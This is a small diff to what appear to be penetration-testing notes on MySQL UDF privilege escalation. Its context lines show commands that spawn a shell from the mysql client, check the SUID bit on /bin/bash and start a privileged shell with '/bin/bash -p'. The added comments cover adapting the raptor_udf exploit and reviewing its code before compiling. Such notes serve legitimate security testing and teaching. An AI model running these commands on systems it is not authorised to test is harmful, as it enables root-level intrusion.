@@ -943,4 +943,10 @@ mysql> !bash
 ls -la /bin/bash                          // Verify that the SUID bit is set
 /bin/bash -p
 id && whoami
+
+// Replace raptor_udf.c 
+// Replace foo with any other table name
+// Ensure that the path to the UDF is correct
+// Ensure to select the correct database / table name
+// Review the vulnerable code before you compile it to ensure there is no malicious code
 ```
